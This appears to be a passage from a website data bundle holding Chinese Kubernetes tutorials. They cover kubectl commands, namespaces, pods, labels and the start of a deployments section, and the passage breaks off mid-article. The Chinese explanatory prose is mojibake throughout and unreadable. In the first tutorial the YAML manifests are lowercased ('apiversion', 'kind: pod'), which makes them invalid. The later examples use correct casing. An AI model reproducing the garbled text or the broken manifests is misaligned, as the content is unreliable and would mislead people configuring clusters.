·ï¼éè¿å®è½å¤å¯¹éç¾¤æ¬èº«è¿è¡ç®¡çï¼å¹¶è½å¤å¨éç¾¤ä¸è¿è¡å®¹å¨ååºç¨çå®è£é¨ç½²ãkubectl å½ä»¤çè¯­æ³å¦ä¸ï¼\n\nkubectl [command] [type] [name] [flags]\n\n\n1\n\n * commandï¼æå®è¦å¯¹èµæºæ§è¡çæä½ï¼ä¾å¦ createãgetãdelete\n * typeï¼æå®èµæºç±»åï¼æ¯å¦ deploymentãpodãservice\n * nameï¼æå®èµæºçåç§°ï¼åç§°å¤§å°åææ\n * flagsï¼æå®é¢å¤çå¯éåæ°\n\n# æ¥çææpod\nkubectl get pod \n\n# æ¥çæä¸ªpod\nkubectl get pod pod_name\n\n# æ¥çæä¸ªpod,ä»¥yamlæ ¼å¼å±ç¤ºç»æ\nkubectl get pod pod_name -o yaml\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# èµæºç±»å\n\nkubernetes ä¸­ææçåå®¹é½æ½è±¡ä¸ºèµæºï¼å¯ä»¥éè¿ä¸é¢çå½ä»¤è¿è¡æ¥ç:\n\nkubectl api-resources\n\n\n1\n\n\nç»å¸¸ä½¿ç¨çèµæºæä¸é¢è¿äºï¼\n\nèµæºåç±»         èµæºåç§°                       ç¼©å       èµæºä½ç¨\néç¾¤çº§å«èµæº       nodes                      no       éç¾¤ç»æé¨å\nnamespaces   ns                         éç¦» pod   \npod èµæº       pods                       po       è£è½½å®¹å¨\npod èµæºæ§å¶å¨    replicationcontrollers     rc       æ§å¶ pod èµæº\n             replicasets                rs       æ§å¶ pod èµæº\n             deployments                deploy   æ§å¶ pod èµæº\n             daemonsets                 ds       æ§å¶ pod èµæº\n             jobs                                æ§å¶ pod èµæº\n             cronjobs                   cj       æ§å¶ pod èµæº\n             horizontalpodautoscalers   hpa      æ§å¶ pod èµæº\n             statefulsets               sts      æ§å¶ pod èµæº\næå¡åç°èµæº       services                   svc      ç»ä¸ pod å¯¹å¤æ¥å£\n             ingress                    ing      ç»ä¸ pod å¯¹å¤æ¥å£\nå­å¨èµæº         volumeattachments                   å­å¨\n             persistentvolumes          pv       å­å¨\n             persistentvolumeclaims     pvc      å­å¨\néç½®èµæº         configmaps                 cm       éç½®\n             secrets                             éç½®\n\n# æä½\n\nkubernetes åè®¸å¯¹èµæºè¿è¡å¤ç§æä½ï¼å¯ä»¥éè¿ --help æ¥çè¯¦ç»çæä½å½ä»¤\n\nkubectl --help\n\n\n1\n\n\nç»å¸¸ä½¿ç¨çæä½æä¸é¢è¿äºï¼\n\nå½ä»¤åç±»    å½ä»¤             ç¿»è¯                 å½ä»¤ä½ç¨\nåºæ¬å½ä»¤    create         åå»º                 åå»ºä¸ä¸ªèµæº\n        edit           ç¼è¾                 ç¼è¾ä¸ä¸ªèµæº\n        get            è·å                 è·åä¸ä¸ªèµæº\n        patch          æ´æ°                 æ´æ°ä¸ä¸ªèµæº\n        delete         å é¤                 å é¤ä¸ä¸ªèµæº\n        explain        è§£é                 å±ç¤ºèµæºææ¡£\nè¿è¡åè°è¯   run            è¿è¡                 å¨éç¾¤ä¸­è¿è¡ä¸ä¸ªæå®çéå\n        expose         æ´é²                 æ´é²èµæºä¸º service\n        describe       æè¿°                 æ¾ç¤ºèµæºåé¨ä¿¡æ¯\n        logs           æ¥å¿è¾åºå®¹å¨å¨ pod ä¸­çæ¥å¿   è¾åºå®¹å¨å¨ pod ä¸­çæ¥å¿\n        attach         ç¼ ç»è¿å¥è¿è¡ä¸­çå®¹å¨         è¿å¥è¿è¡ä¸­çå®¹å¨\n        exec           æ§è¡å®¹å¨ä¸­çä¸ä¸ªå½ä»¤         æ§è¡å®¹å¨ä¸­çä¸ä¸ªå½ä»¤\n        cp             å¤å¶                 å¨ pod åå¤å¤å¶æä»¶\n        rollout        é¦æ¬¡å±ç¤º               ç®¡çèµæºçåå¸\n        scale          è§æ¨¡                 æ© (ç¼©) å®¹ pod çæ°é\n        autoscale      èªå¨è°æ´               èªå¨è°æ´ pod çæ°é\né«çº§å½ä»¤    apply          rc                 éè¿æä»¶å¯¹èµæºè¿è¡éç½®\n        label          æ ç­¾                 æ´æ°èµæºä¸çæ ç­¾\nå¶ä»å½ä»¤    cluster-info   éç¾¤ä¿¡æ¯               æ¾ç¤ºéç¾¤ä¿¡æ¯\n        version        çæ¬                 æ¾ç¤ºå½å server å client ççæ¬\n\nä¸é¢ä»¥ä¸ä¸ª namespace /pod çåå»ºåå é¤ç®åæ¼ç¤ºä¸å½ä»¤çä½¿ç¨ï¼\n\n# åå»ºä¸ä¸ªnamespace\n[root@master ~]# kubectl create namespace dev\nnamespace/dev created\n\n# è·ånamespace\n[root@master ~]# kubectl get ns\nname              status   age\ndefault           active   21h\ndev               active   21s\nkube-node-lease   active   21h\nkube-public       active   21h\nkube-system       active   21h\n\n# å¨æ­¤namespaceä¸åå»ºå¹¶è¿è¡ä¸ä¸ªnginxçpod\n[root@master ~]# kubectl run pod --image=nginx:latest -n dev\nkubectl run --generator=deployment/apps.v1 is deprecated and will be removed in a future version. use kubectl run --generator=run-pod/v1 or kubectl create instead.\ndeployment.apps/pod created\n\n# æ¥çæ°åå»ºçpod\n[root@master ~]# kubectl get pod -n dev\nname  ready   status    restarts   age\npod   1/1     running   0          21s\n\n# å é¤æå®çpod\n[root@master ~]# kubectl delete pod pod-864f9875b9-pcw7x\npod "pod" deleted\n\n# å é¤æå®çnamespace\n[root@master ~]# kubectl delete ns dev\nnamespace "dev" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n\n# å½ä»¤å¼å¯¹è±¡éç½®\n\nå½ä»¤å¼å¯¹è±¡éç½®å°±æ¯ä½¿ç¨å½ä»¤éåéç½®æä»¶ä¸èµ·æ¥æä½ kubernetes èµæºã\n1ï¼ åå»ºä¸ä¸ª nginxpod.yamlï¼åå®¹å¦ä¸ï¼\n\n# çæ¬\napiversion: v1\n# ç±»å\nkind: namespace\n# åæ°æ®\nmetadata:\n  # åç§°\n  name: dev\n\n---\n\napiversion: v1\nkind: pod\nmetadata:\n  # åç§°\n  name: nginxpod\n  # æå¨å½åç©ºé´\n  namespace: dev\n# è¯¦ç»æè¿°\nspec:\n  containers:\n  # å®¹å¨çåå­\n  - name: nginx-containers\n    # å®¹å¨æç¨çéå\n    image: nginx:latest\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n2ï¼æ§è¡ create å½ä»¤ï¼åå»ºèµæºï¼\n\n[root@master ~]# kubectl create -f nginxpod.yaml\nnamespace/dev created\npod/nginxpod created\n\n\n1\n2\n3\n\n\næ­¤æ¶åç°åå»ºäºä¸¤ä¸ªèµæºå¯¹è±¡ï¼åå«æ¯ namespace å pod\n\n3ï¼æ§è¡ get å½ä»¤ï¼æ¥çèµæºï¼\n\n[root@master ~]#  kubectl get -f nginxpod.yaml\nname            status   age\nnamespace/dev   active   18s\n\nname            ready   status    restarts   age\npod/nginxpod    1/1     running   0          17s\n\n\n1\n2\n3\n4\n5\n6\n\n\nè¿æ ·å°±æ¾ç¤ºäºä¸¤ä¸ªèµæºå¯¹è±¡çä¿¡æ¯\n\n4ï¼æ§è¡ delete å½ä»¤ï¼å é¤èµæºï¼\n\n[root@master ~]# kubectl delete -f nginxpod.yaml\nnamespace "dev" deleted\npod "nginxpod" deleted\n\n\n1\n2\n3\n\n\næ­¤æ¶åç°ä¸¤ä¸ªèµæºå¯¹è±¡è¢«å é¤äº\n\næ»ç»:\n    å½ä»¤å¼å¯¹è±¡éç½®çæ¹å¼æä½èµæºï¼å¯ä»¥ç®åçè®¤ä¸ºï¼å½ä»¤  +  yamléç½®æä»¶ï¼éé¢æ¯å½ä»¤éè¦çåç§åæ°ï¼\n\n\n1\n2\n\n\n\n# å£°æå¼å¯¹è±¡éç½®\n\nå£°æå¼å¯¹è±¡éç½®è·å½ä»¤å¼å¯¹è±¡éç½®å¾ç¸ä¼¼ï¼ä½æ¯å®åªæä¸ä¸ªå½ä»¤ applyã\n\n# é¦åæ§è¡ä¸æ¬¡kubectl apply -f yamlæä»¶ï¼åç°åå»ºäºèµæº\n[root@master ~]#  kubectl apply -f nginxpod.yaml\nnamespace/dev created\npod/nginxpod created\n\n# åæ¬¡æ§è¡ä¸æ¬¡kubectl apply -f yamlæä»¶ï¼åç°è¯´èµæºæ²¡æåå¨\n[root@master ~]#  kubectl apply -f nginxpod.yaml\nnamespace/dev unchanged\npod/nginxpod unchanged\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\næ»ç»:\n    å¶å®å£°æå¼å¯¹è±¡éç½®å°±æ¯ä½¿ç¨applyæè¿°ä¸ä¸ªèµæºæç»çç¶æï¼å¨yamlä¸­å®ä¹ç¶æï¼\n    ä½¿ç¨applyæä½èµæºï¼\n        å¦æèµæºä¸å­å¨ï¼å°±åå»ºï¼ç¸å½äº kubectl create\n        å¦æèµæºå·²å­å¨ï¼å°±æ´æ°ï¼ç¸å½äº kubectl patch\n\n\n1\n2\n3\n4\n5\n\n\n> æ©å±ï¼kubectl å¯ä»¥å¨ node èç¹ä¸è¿è¡åï¼\n\nkubectl çè¿è¡æ¯éè¦è¿è¡éç½®çï¼å®çéç½®æä»¶æ¯ $home/.kubeï¼å¦ææ³è¦å¨ node èç¹è¿è¡æ­¤å½ä»¤ï¼éè¦å° master ä¸ç.kube æä»¶å¤å¶å° node èç¹ä¸ï¼å³å¨ master èç¹ä¸æ§è¡ä¸é¢æä½ï¼\n\nscp  -r  ~/.kube   node102:~/\n\n\n1\n\n\n> ä½¿ç¨æ¨èï¼ä¸ç§æ¹å¼åºè¯¥æä¹ç¨ï¼\n> åå»º / æ´æ°èµæº ä½¿ç¨å£°æå¼å¯¹è±¡éç½® kubectl apply -f xxx.yaml\n> å é¤èµæº ä½¿ç¨å½ä»¤å¼å¯¹è±¡éç½® kubectl delete -f xxx.yaml\n> æ¥è¯¢èµæº ä½¿ç¨å½ä»¤å¼å¯¹è±¡ç®¡ç kubectl get (describe) èµæºåç§°',charsets:{cjk:!0}},{title:"kubernetes(å) NamespaceãPodãLableãDeploymentãService çèµæºä»ç»",frontmatter:{title:"kubernetes(å) NamespaceãPodãLableãDeploymentãService çèµæºä»ç»",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/603",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/60.Kubernetes/603.kubernetes(%E5%9B%9B)%20Namespace%E3%80%81Pod%E3%80%81Lable%E3%80%81Deployment%E3%80%81Service%20%E7%9A%84%E8%B5%84%E6%BA%90%E4%BB%8B%E7%BB%8D.html",relativePath:"04.è¿ç»´/60.Kubernetes/603.kubernetes(å) NamespaceãPodãLableãDeploymentãService çèµæºä»ç».md",key:"v-be3913a8",path:"/kubernetes/603/",headers:[{level:2,title:"Namespace",slug:"namespace",normalizedTitle:"namespace",charIndex:2},{level:2,title:"Pod",slug:"pod",normalizedTitle:"pod",charIndex:107},{level:2,title:"Label",slug:"label",normalizedTitle:"label",charIndex:1735},{level:2,title:"Deployment",slug:"deployment",normalizedTitle:"deployment",charIndex:10052},{level:2,title:"Service",slug:"service",normalizedTitle:"service",charIndex:7882}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"Namespace Pod Label Deployment Service",content:'# Namespace\n\nNamespace æ¯ kubernetes ç³»ç»ä¸­çä¸ç§éå¸¸éè¦èµæºï¼å®çä¸»è¦ä½ç¨æ¯ç¨æ¥å®ç°å¤å¥ç¯å¢çèµæºéç¦»æèå¤ç§æ·çèµæºéç¦»ã\n\né»è®¤æåµä¸ï¼kubernetes éç¾¤ä¸­çææç Pod é½æ¯å¯ä»¥ç¸äºè®¿é®çãä½æ¯å¨å®éä¸­ï¼å¯è½ä¸æ³è®©ä¸¤ä¸ª Pod ä¹é´è¿è¡äºç¸çè®¿é®ï¼é£æ­¤æ¶å°±å¯ä»¥å°ä¸¤ä¸ª Pod ååå°ä¸åç namespace ä¸ãkubernetes éè¿å°éç¾¤åé¨çèµæºåéå°ä¸åç Namespace ä¸­ï¼å¯ä»¥å½¢æé»è¾ä¸ç "ç»"ï¼ä»¥æ¹ä¾¿ä¸åçç»çèµæºè¿è¡éç¦»ä½¿ç¨åç®¡çã\n\nå¯ä»¥éè¿ kubernetes çæææºå¶ï¼å°ä¸åç namespace äº¤ç»ä¸åç§æ·è¿è¡ç®¡çï¼è¿æ ·å°±å®ç°äºå¤ç§æ·çèµæºéç¦»ãæ­¤æ¶è¿è½ç»å kubernetes çèµæºéé¢æºå¶ï¼éå®ä¸åç§æ·è½å ç¨çèµæºï¼ä¾å¦ CPU ä½¿ç¨éãåå­ä½¿ç¨éç­ç­ï¼æ¥å®ç°ç§æ·å¯ç¨èµæºçç®¡çã\n\n\n\nkubernetes å¨éç¾¤å¯å¨ä¹åï¼ä¼é»è®¤åå»ºå ä¸ª namespace\n\n[root@master ~]# kubectl  get namespace\nNAME              STATUS   AGE\ndefault           Active   45h     \nkube-node-lease   Active   45h  \nkube-public       Active   45h     \nkube-system       Active   45h    \n\n\n1\n2\n3\n4\n5\n6\n\n * default æææªæå® Namespace çå¯¹è±¡é½ä¼è¢«åéå¨ default å½åç©ºé´\n * kube-node-lease éç¾¤èç¹ä¹é´çå¿è·³ç»´æ¤ï¼v1.13 å¼å§å¼å¥\n * kube-public æ­¤å½åç©ºé´ä¸çèµæºå¯ä»¥è¢«ææäººè®¿é®ï¼åæ¬æªè®¤è¯ç¨æ·ï¼\n * kube-system ææç± Kubernetes ç³»ç»åå»ºçèµæºé½å¤äºè¿ä¸ªå½åç©ºé´\n\nä¸é¢æ¥ç namespace èµæºçå·ä½æä½ï¼\næ¥ç\n\n# 1 æ¥çææçns  å½ä»¤ï¼kubectl get ns\n[root@master ~]# kubectl get ns\nNAME              STATUS   AGE\ndefault           Active   45h\nkube-node-lease   Active   45h\nkube-public       Active   45h     \nkube-system       Active   45h     \n\n# 2 æ¥çæå®çns   å½ä»¤ï¼kubectl get ns nsåç§°\n[root@master ~]# kubectl get ns default\nNAME      STATUS   AGE\ndefault   Active   45h\n\n# 3 æå®è¾åºæ ¼å¼  å½ä»¤ï¼kubectl get ns nsåç§°  -o æ ¼å¼åæ°\n# kubernetesæ¯æçæ ¼å¼æå¾å¤ï¼æ¯è¾å¸¸è§çæ¯wideãjsonãyaml\n[root@master ~]# kubectl get ns default -o yaml\napiVersion: v1\nkind: Namespace\nmetadata:\n  creationTimestamp: "2021-05-08T04:44:16Z"\n  name: default\n  resourceVersion: "151"\n  selfLink: /api/v1/namespaces/default\n  uid: 7405f73a-e486-43d4-9db6-145f1409f090\nspec:\n  finalizers:\n  - kubernetes\nstatus:\n  phase: Active\n  \n# 4 æ¥çnsè¯¦æ  å½ä»¤ï¼kubectl describe ns nsåç§°\n[root@master ~]# kubectl describe ns default\nName:         default\nLabels:       <none>\nAnnotations:  <none>\nStatus:       Active  # Active å½åç©ºé´æ­£å¨ä½¿ç¨ä¸­  Terminating æ­£å¨å é¤å½åç©ºé´\n\n# ResourceQuota éå¯¹namespaceåçèµæºéå¶\n# LimitRangeéå¯¹namespaceä¸­çæ¯ä¸ªç»ä»¶åçèµæºéå¶\nNo resource quota.\nNo LimitRange resource.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\nåå»º\n\n# åå»ºnamespace\n[root@master ~]# kubectl create ns dev\nnamespace/dev created\n\n\n1\n2\n3\n\n\nå é¤\n\n# å é¤namespace\n[root@master ~]# kubectl delete ns dev\nnamespace "dev" deleted\n\n\n1\n2\n3\n\n\néç½®æ¹å¼\n\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: dev\n\n\n1\n2\n3\n4\n\n\nç¶åå°±å¯ä»¥æ§è¡å¯¹åºçåå»ºåå é¤å½ä»¤äºï¼\nåå»ºï¼kubectl create -f ns-dev.yaml\nå é¤ï¼kubectl delete -f ns-dev.yaml\n\n\n# Pod\n\nPod æ¯ kubernetes éç¾¤è¿è¡ç®¡ççæå°ååï¼ç¨åºè¦è¿è¡å¿é¡»é¨ç½²å¨å®¹å¨ä¸­ï¼èå®¹å¨å¿é¡»å­å¨äº Pod ä¸­ãPod å¯ä»¥è®¤ä¸ºæ¯å®¹å¨çå°è£ï¼ä¸ä¸ª Pod ä¸­å¯ä»¥å­å¨ä¸ä¸ªæèå¤ä¸ªå®¹å¨ã\n\n\n\nkubernetes å¨éç¾¤å¯å¨ä¹åï¼éç¾¤ä¸­çåä¸ªç»ä»¶ä¹é½æ¯ä»¥ Pod æ¹å¼è¿è¡çãå¯ä»¥éè¿ä¸é¢å½ä»¤æ¥çï¼\n\n[root@master ~]# kubectl get pod -n kube-system\nNAMESPACE     NAME                             READY   STATUS    RESTARTS   AGE\nkube-system   coredns-6955765f44-68g6v         1/1     Running   0          2d1h\nkube-system   coredns-6955765f44-cs5r8         1/1     Running   0          2d1h\nkube-system   etcd-master                      1/1     Running   0          2d1h\nkube-system   kube-apiserver-master            1/1     Running   0          2d1h\nkube-system   kube-controller-manager-master   1/1     Running   0          2d1h\nkube-system   kube-flannel-ds-amd64-47r25      1/1     Running   0          2d1h\nkube-system   kube-flannel-ds-amd64-ls5lh      1/1     Running   0          2d1h\nkube-system   kube-proxy-685tk                 1/1     Running   0          2d1h\nkube-system   kube-proxy-87spt                 1/1     Running   0          2d1h\nkube-system   kube-scheduler-master            1/1     Running   0          2d1h\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nåå»ºå¹¶è¿è¡\nkubernetes æ²¡ææä¾åç¬è¿è¡ Pod çå½ä»¤ï¼é½æ¯éè¿ Pod æ§å¶å¨æ¥å®ç°ç\n\n# å½ä»¤æ ¼å¼ï¼ kubectl run (podæ§å¶å¨åç§°) [åæ°] \n# --image  æå®Podçéå\n# --port   æå®ç«¯å£\n# --namespace  æå®namespace\n[root@master ~]# kubectl run nginx --image=nginx:latest --port=80 --namespace dev \ndeployment.apps/nginx created\n\n\n1\n2\n3\n4\n5\n6\n\n\næ¥ç pod ä¿¡æ¯\n\n# æ¥çPodåºæ¬ä¿¡æ¯\n[root@master ~]# kubectl get pods -n dev\nNAME    READY   STATUS    RESTARTS   AGE\nnginx   1/1     Running   0          43s\n\n# æ¥çPodçè¯¦ç»ä¿¡æ¯\n[root@master ~]# kubectl describe pod nginx -n dev\nName:         nginx\nNamespace:    dev\nPriority:     0\nNode:         node1/192.168.5.4\nStart Time:   Wed, 08 May 2021 09:29:24 +0800\nLabels:       pod-template-hash=5ff7956ff6\n              run=nginx\nAnnotations:  <none>\nStatus:       Running\nIP:           10.244.1.23\nIPs:\n  IP:           10.244.1.23\nControlled By:  ReplicaSet/nginx\nContainers:\n  nginx:\n    Container ID:   docker://4c62b8c0648d2512380f4ffa5da2c99d16e05634979973449c98e9b829f6253c\n    Image:          nginx:latest\n    Image ID:       docker-pullable://nginx@sha256:485b610fefec7ff6c463ced9623314a04ed67e3945b9c08d7e53a47f6d108dc7\n    Port:           80/TCP\n    Host Port:      0/TCP\n    State:          Running\n      Started:      Wed, 08 May 2021 09:30:01 +0800\n    Ready:          True\n    Restart Count:  0\n    Environment:    <none>\n    Mounts:\n      /var/run/secrets/kubernetes.io/serviceaccount from default-token-hwvvw (ro)\nConditions:\n  Type              Status\n  Initialized       True\n  Ready             True\n  ContainersReady   True\n  PodScheduled      True\nVolumes:\n  default-token-hwvvw:\n    Type:        Secret (a volume populated by a Secret)\n    SecretName:  default-token-hwvvw\n    Optional:    false\nQoS Class:       BestEffort\nNode-Selectors:  <none>\nTolerations:     node.kubernetes.io/not-ready:NoExecute for 300s\n                 node.kubernetes.io/unreachable:NoExecute for 300s\nEvents:\n  Type    Reason     Age        From               Message\n  ----    ------     ----       ----               -------\n  Normal  Scheduled  <unknown>  default-scheduler  Successfully assigned dev/nginx-5ff7956ff6-fg2db to node1\n  Normal  Pulling    4m11s      kubelet, node1     Pulling image "nginx:latest"\n  Normal  Pulled     3m36s      kubelet, node1     Successfully pulled image "nginx:latest"\n  Normal  Created    3m36s      kubelet, node1     Created container nginx\n  Normal  Started    3m36s      kubelet, node1     Started container nginx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\nè®¿é® Pod\n\n# è·åpodIP\n[root@master ~]# kubectl get pods -n dev -o wide\nNAME    READY   STATUS    RESTARTS   AGE    IP             NODE    ... \nnginx   1/1     Running   0          190s   10.244.1.23   node1   ...\n\n#è®¿é®POD\n[root@master ~]# curl http://10.244.1.23:80\n<!DOCTYPE html>\n<html>\n<head>\n\t<title>Welcome to nginx!</title>\n</head>\n<body>\n\t<p><em>Thank you for using nginx.</em></p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nå é¤æå® Pod\n\n# å é¤æå®Pod\n[root@master ~]# kubectl delete pod nginx -n dev\npod "nginx" deleted\n\n# æ­¤æ¶ï¼æ¾ç¤ºå é¤Podæåï¼ä½æ¯åæ¥è¯¢ï¼åç°åæ°äº§çäºä¸ä¸ª \n[root@master ~]# kubectl get pods -n dev\nNAME    READY   STATUS    RESTARTS   AGE\nnginx   1/1     Running   0          21s\n\n# è¿æ¯å ä¸ºå½åPodæ¯ç±Podæ§å¶å¨åå»ºçï¼æ§å¶å¨ä¼çæ§Podç¶åµï¼ä¸æ¦åç°Podæ­»äº¡ï¼ä¼ç«å³éå»º\n# æ­¤æ¶è¦æ³å é¤Podï¼å¿é¡»å é¤Podæ§å¶å¨\n\n# åæ¥æ¥è¯¢ä¸ä¸å½ånamespaceä¸çPodæ§å¶å¨\n[root@master ~]# kubectl get deploy -n  dev\nNAME    READY   UP-TO-DATE   AVAILABLE   AGE\nnginx   1/1     1            1           9m7s\n\n# æ¥ä¸æ¥ï¼å é¤æ­¤PodPodæ§å¶å¨\n[root@master ~]# kubectl delete deploy nginx -n dev\ndeployment.apps "nginx" deleted\n\n# ç¨ç­çå»ï¼åæ¥è¯¢Podï¼åç°Podè¢«å é¤äº\n[root@master ~]# kubectl get pods -n dev\nNo resources found in dev namespace.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\néç½®æä½\nåå»ºä¸ä¸ª pod-nginx.yamlï¼åå®¹å¦ä¸ï¼\nè¿ç§åå»ºæ¹å¼ä¸ä¼å kubectl run å¨åå»º Pod æ¶ä¼åå»º Pod æ§å¶å¨ï¼ä»¥ä¸æ¯ä¸ä¼åå»º Pod æ§å¶å¨çã\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\n  namespace: dev\nspec:\n  containers:\n  - image: nginx:latest\n    name: pod\n    ports:\n    - name: nginx-port\n      containerPort: 80\n      protocol: TCP\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nç¶åå°±å¯ä»¥æ§è¡å¯¹åºçåå»ºåå é¤å½ä»¤äºï¼\nåå»ºï¼kubectl create -f pod-nginx.yaml\nå é¤ï¼kubectl delete -f pod-nginx.yaml\n\n\n# Label\n\nLabel æ¯ kubernetes ç³»ç»ä¸­çä¸ä¸ªéè¦æ¦å¿µãå®çä½ç¨å°±æ¯å¨èµæºä¸æ·»å æ è¯ï¼ç¨æ¥å¯¹å®ä»¬è¿è¡åºååéæ©ã\n\nLabel çç¹ç¹ï¼\n\n * ä¸ä¸ª Label ä¼ä»¥ key/value é®å¼å¯¹çå½¢å¼éå å°åç§å¯¹è±¡ä¸ï¼å¦ NodeãPodãService ç­ç­\n * ä¸ä¸ªèµæºå¯¹è±¡å¯ä»¥å®ä¹ä»»ææ°éç Label ï¼åä¸ä¸ª Label ä¹å¯ä»¥è¢«æ·»å å°ä»»ææ°éçèµæºå¯¹è±¡ä¸å»\n * Label éå¸¸å¨èµæºå¯¹è±¡å®ä¹æ¶ç¡®å®ï¼å½ç¶ä¹å¯ä»¥å¨å¯¹è±¡åå»ºåå¨ææ·»å æèå é¤\n\nå¯ä»¥éè¿ Label å®ç°èµæºçå¤ç»´åº¦åç»ï¼ä»¥ä¾¿çµæ´»ãæ¹ä¾¿å°è¿è¡èµæºåéãè°åº¦ãéç½®ãé¨ç½²ç­ç®¡çå·¥ä½ã\n\n> ä¸äºå¸¸ç¨ç Label ç¤ºä¾å¦ä¸ï¼\n> çæ¬æ ç­¾ï¼"version":"release", "version":"stable"......\n> ç¯å¢æ ç­¾ï¼"environment":"dev"ï¼"environment":"test"ï¼"environment":"pro"\n> æ¶ææ ç­¾ï¼"tier":"frontend"ï¼"tier":"backend"\n\næ ç­¾å®ä¹å®æ¯ä¹åï¼è¿è¦èèå°æ ç­¾çéæ©ï¼è¿å°±è¦ä½¿ç¨å° Label Selectorï¼å³ï¼\nLabel ç¨äºç»æä¸ªèµæºå¯¹è±¡å®ä¹æ è¯\nLabel Selector ç¨äºæ¥è¯¢åç­éæ¥ææäºæ ç­¾çèµæºå¯¹è±¡\n\nå½åæä¸¤ç§ Label Selectorï¼\n\n * åºäºç­å¼ç Label Selector\n   name = slave: éæ©ææåå« Label ä¸­ key="name" ä¸ value="slave" çå¯¹è±¡\n   env != production: éæ©ææåæ¬ Label ä¸­ç key="env" ä¸ value ä¸ç­äº "production" çå¯¹è±¡\n * åºäºéåç Label Selector\n   name in (master, slave): éæ©ææåå« Label ä¸­ç key="name" ä¸ value="master" æ "slave" çå¯¹è±¡\n   name not in (frontend): éæ©ææåå« Label ä¸­ç key="name" ä¸ value ä¸ç­äº "frontend" çå¯¹è±¡\n\næ ç­¾çéæ©æ¡ä»¶å¯ä»¥ä½¿ç¨å¤ä¸ªï¼æ­¤æ¶å°å¤ä¸ª Label Selector è¿è¡ç»åï¼ä½¿ç¨éå· "," è¿è¡åéå³å¯ãä¾å¦ï¼\nname=slaveï¼env!=production\nname not in (frontend)ï¼env!=production\n\nå½ä»¤æ¹å¼\n\n# ä¸ºpodèµæºææ ç­¾\n[root@master ~]# kubectl label pod nginx-pod version=1.0 -n dev\npod/nginx-pod labeled\n\n# ä¸ºpodèµæºæ´æ°æ ç­¾\n[root@master ~]# kubectl label pod nginx-pod version=2.0 -n dev --overwrite\npod/nginx-pod labeled\n\n# æ¥çæ ç­¾\n[root@master ~]# kubectl get pod nginx-pod  -n dev --show-labels\nNAME        READY   STATUS    RESTARTS   AGE   LABELS\nnginx-pod   1/1     Running   0          10m   version=2.0\n\n# ç­éæ ç­¾\n[root@master ~]# kubectl get pod -n dev -l version=2.0  --show-labels\nNAME        READY   STATUS    RESTARTS   AGE   LABELS\nnginx-pod   1/1     Running   0          17m   version=2.0\n[root@master ~]# kubectl get pod -n dev -l version!=2.0 --show-labels\nNo resources found in dev namespace.\n\n#å é¤æ ç­¾\n[root@master ~]# kubectl label pod nginx-pod version- -n dev\npod/nginx-pod labeled\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\néç½®æ¹å¼\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\n  namespace: dev\n  # åå»ºæ¶æ·»å æ ç­¾\n  labels:\n    version: "3.0" \n    env: "test"\nspec:\n  containers:\n  - image: nginx:latest\n    name: pod\n    ports:\n    - name: nginx-port\n      containerPort: 80\n      protocol: TCP\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nç¶åå°±å¯ä»¥æ§è¡å¯¹åºçæ´æ°å½ä»¤äºï¼kubectl apply -f pod-nginx.yaml\n\n\n# Deployment\n\nå¨ kubernetes ä¸­ï¼Pod æ¯æå°çæ§å¶ååï¼ä½æ¯ kubernetes å¾å°ç´æ¥æ§å¶ Podï¼ä¸è¬é½æ¯éè¿ Pod æ§å¶å¨æ¥å®æçãPod æ§å¶å¨ç¨äº pod çç®¡çï¼ç¡®ä¿ pod èµæºç¬¦åé¢æçç¶æï¼å½ pod çèµæºåºç°æéæ¶ï¼ä¼å°è¯è¿è¡éå¯æéå»º podã\n\nå¨ kubernetes ä¸­ Pod æ§å¶å¨çç§ç±»æå¾å¤ï¼æ¬ç« èåªä»ç»ä¸ç§ï¼Deploymentã\n\n\n\nå½ä»¤æä½\n\n# å½ä»¤æ ¼å¼: kubectl run Deploymentåç§°  [åæ°] \n# --image  æå®podçéå\n# --port   æå®ç«¯å£\n# --replicas  æå®åå»ºpodæ°é\n# --namespace  æå®namespace\n[root@master ~]# kubectl run nginx --image=nginx:latest --port=80 --replicas=3 -n dev\ndeployment.apps/nginx created\n\n# æ¥çåå»ºçPod\n[root@master ~]# kubectl get pods -n dev\nNAME                     READY   STATUS    RESTARTS   AGE\nnginx-5ff7956ff6-6k8cb   1/1     Running   0          19s\nnginx-5ff7956ff6-jxfjt   1/1     Running   0          19s\nnginx-5ff7956ff6-v6jqw   1/1     Running   0          19s\n\n# 